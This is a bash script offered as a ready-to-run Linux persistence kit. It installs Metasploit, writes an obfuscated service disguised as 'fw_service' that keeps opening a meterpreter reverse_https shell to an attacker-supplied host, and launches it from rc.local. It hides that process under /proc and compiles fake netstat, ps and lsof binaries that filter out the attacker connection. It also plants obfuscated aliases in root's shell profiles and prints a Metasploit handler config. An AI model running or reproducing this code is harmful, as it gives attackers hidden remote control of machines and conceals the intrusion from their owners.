#!/bin/bash

printf "\033[1;37m"
read -p "LHOST: " LHOST
read -p "LPORT: " LPORT
printf "\033[0m"

#//// install tools ////
if [ -n "$(apt search metasploit-framework)" ] ; then apt-get -y install gcc metasploit-framework nodejs npm shc python3 ; else apt-get -y install gcc nodejs npm shc python3 ; curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall ; fi
sleep 1 ; npm i -g bash-obfuscate


#//// install backdoor ////
cat<<EOF>/usr/bin/fw_service
#!/bin/bash
mkdir /etc/unkn0wn &> /dev/null ; pidofme="\$\$" ; mount -o bind /etc/unkn0wn /proc/\$pidofme
while true ; do [[ -z "\$(/usr/bin/netstat -antp | grep $LPORT | grep -v CLOSE_WAIT)" ]] && msfvenom -p python/meterpreter/reverse_https lhost=$LHOST lport=$LPORT | python3 || sleep 30 ; done
EOF

bash-obfuscate -r /usr/bin/fw_service -o /usr/bin/fw_service ; sed -i '1i #!/bin/bash' /usr/bin/fw_service ; shc -r -f /usr/bin/fw_service -o /usr/bin/fw_service -SU ; rm /usr/bin/fw_service.x.c
[[ -z "$(ls /etc/rc.local)" ]] && printf "#\!/bin/bash\n\nsudo /usr/bin/fw_service" > /etc/rc.local || echo 'sudo /usr/bin/fw_service' >> /etc/rc.local ; chmod +x /etc/rc.local

#/// compile fake netstat ps lsof ////
#netstat
touch /tmp/.netstat.c
cat <<EOF> /tmp/.netstat.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/bin/netstat \$*|grep -Ev 'LHOST|LPORT|fw_service'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF
sed -i "s+LHOST+$LHOST+g" /tmp/.netstat.c ; sed -i "s+LPORT+$LPORT+g" /tmp/.netstat.c ; gcc -xc /tmp/.netstat.c -o /usr/local/bin/netstat

#ps
cat <<EOF> /tmp/.ps.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/bin/ps \$*|grep -Ev 'LHOST|LPORT|fw_service'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF
sed -i "s+LHOST+$LHOST+g" /tmp/.ps.c ; sed -i "s+LPORT+$LPORT+g" /tmp/.ps.c ; gcc -xc /tmp/.ps.c -o /usr/local/bin/ps

#lsof
cat <<EOF> /tmp/.lsof.c
int main(int a,char**b){
  char*c[999999]={"sh","-c","/usr/bin/lsof \$*|grep -Ev 'LHOST|LPORT|fw_service'"};
  memcpy(c+3,b,8*a);
  execv("/bin/sh",c);
}
EOF
sed -i "s+LHOST+$LHOST+g" /tmp/.lsof.c ; sed -i "s+LPORT+$LPORT+g" /tmp/.lsof.c ; gcc -xc /tmp/.lsof.c -o /usr/local/bin/lsof

#//// hide aliases
cat<<EOF>/tmp/.profile.d
alias netstat="/usr/local/bin/netstat"
alias ps="/usr/local/bin/ps"
alias lsof="/usr/local/bin/lsof"
EOF

bash-obfuscate -c 1 /tmp/.profile.d -o /etc/profile.d/.profile.d

echo '. /etc/profile.d/.profile.d' > /tmp/.prd ; bash-obfuscate -r /tmp/.prd -o /tmp/.prd

{
sed -i "1 a $(echo $(cat /tmp/.prd))" /root/.bashrc
sed -i "1 a $(echo $(cat /tmp/.prd))" /root/.zshrc
sed -i "1 a $(echo $(cat /tmp/.prd))" /root/.profile
}&>/dev/null

systemctl enable firewall_service ; systemctl start firewall_service

printf "\n\n\\033[1;32mГотово! Используйте resource.rc на msf-сервере:\n\033[0m\n"
print "use exploit/multi/handler\nset payload python/meterpreter/reverse_https\nset lhost 0.0.0.0\nset lport $LPORT\nrun -j -z"  > resource.rc ; cat resource.rc
printf "\n\033[1;31mmsfconsole -q -r resource.rc\n"
